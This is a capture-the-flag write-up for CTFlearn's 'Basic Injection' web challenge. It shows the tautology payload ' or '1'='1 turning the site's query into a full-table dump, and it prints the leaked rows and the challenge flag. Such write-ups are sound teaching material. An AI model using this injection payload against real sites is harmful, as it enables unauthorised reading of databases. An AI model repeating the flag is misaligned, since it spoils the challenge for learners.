# Basic Injection
## Description
See if you can leak the whole database using what you know about SQL Injections.

Challenge URL: https://web.ctflearn.com/web4/

## Solution
We see that the original query is:
```
Original Query: SELECT * FROM webfour.webfour where name = '$input'
```

So it's easy to exploit:
```
$input = ' or '1'='1
```

This results in
```
Original Query: SELECT * FROM webfour.webfour where name = '$input'

Your Resulting Query: SELECT * FROM webfour.webfour where name = '' or '1'='1'

Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii
```

> Flag: `CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}`
